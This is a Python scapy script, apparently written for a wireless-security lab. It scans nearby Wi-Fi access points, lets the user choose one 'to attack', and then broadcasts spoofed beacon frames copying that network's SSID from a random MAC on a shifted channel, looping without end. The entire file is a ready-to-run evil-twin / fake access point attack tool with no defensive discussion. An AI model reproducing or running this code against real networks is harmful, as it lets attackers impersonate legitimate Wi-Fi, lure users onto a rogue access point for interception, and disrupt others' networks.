# This script list the access point aivailable, and the let the user choose one 
# to fake. It doesn't list AP without name.
# The fake AP will be 6 channel away from the original.
#
# To interupt the scan that search for AP, use ctrl+c
# To stop the script, use ctrl+c

import os
from multiprocessing import Process
from scapy.all import *

# Set interface
iface = "wlan0mon"

# List of AP's MAC
mac_list = []
# List of AP's packets
ap_pkt_list = []

# Index for the printed list
i = 0

# Function that handle sniffed packets
def PacketHandler(pkt):

	# Get AP's packet, if mac not already in the list, and SSID not null
	if pkt.haslayer(Dot11Beacon) and pkt.addr2 not in mac_list and pkt.info.decode('UTF-8') != "":
			mac_list.append(pkt.addr2)
			# It's easier to store full packet then each value we need after (but heavier)
			ap_pkt_list.append(pkt)
			global i
			i += 1
			# Extract the channel number
			ch = int(ord(pkt[Dot11Elt:3].info))
			# Print the MAC, SSID, Channel nb, and RSSID of the AP
			print('%d AP MAC: %s with SSID: %s - channel: %s - RSSI: %s' % (i, pkt.addr2, pkt.info.decode('UTF-8'), ch, pkt.dBm_AntSignal))


# function to hop through the channels. Copied from:
# https://charlesreid1.com/wiki/Scapy/AP_Scanner#Channel_Hopper
def channel_hopper():
    while True:
        try:
            channel = random.randrange(1,12)
            os.system("iw dev %s set channel %d" % (iface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
	# Start the channel hopper
	p = Process(target = channel_hopper)
	p.start()

	# Start the packet sniffer to fill the AP list
	sniff(iface=iface, prn = PacketHandler)

	# User input, SSID to fake
	selected = input ("Selectionner le SSID a attaquer (1 - %d):" %(i))
	selected = int(selected) -1

	# Set the new channel number with a gap of 6 ch. from the original
	if ap_pkt_list[selected].channel - 6 < 1:
		channel =  ap_pkt_list[selected].channel + 6
	else:
		channel =  ap_pkt_list[selected].channel - 6

	# Create a random MAC for the fake channel
	sender_mac = RandMAC()

	# SSID of the AP we want to fake
	ssid = ap_pkt_list[selected].info.decode("UTF-8")

	# 802.11 layer with subtype 8 -> beacon
	# Source MAC is the random one, and destination is broadcast
	dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)

	beacon = Dot11Beacon()

	# Add information on managment layer: SSID and channel number
	essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))/Dot11Elt(ID='DSset', info=channel.to_bytes(1, 'big'), len=1)

	# Put all layer together to create the packet
	frame = RadioTap()/dot11/beacon/essid

	# Set channel on the os
	os.system("iw dev %s set channel %d" % (iface, channel))
	
	# Print info
	print("Fake SSID on channel: " + str(channel))

	# Send one packet each 100 ms on the interface infinitely (loop=1)
	sendp(frame, inter=0.1, iface=iface, loop=1)





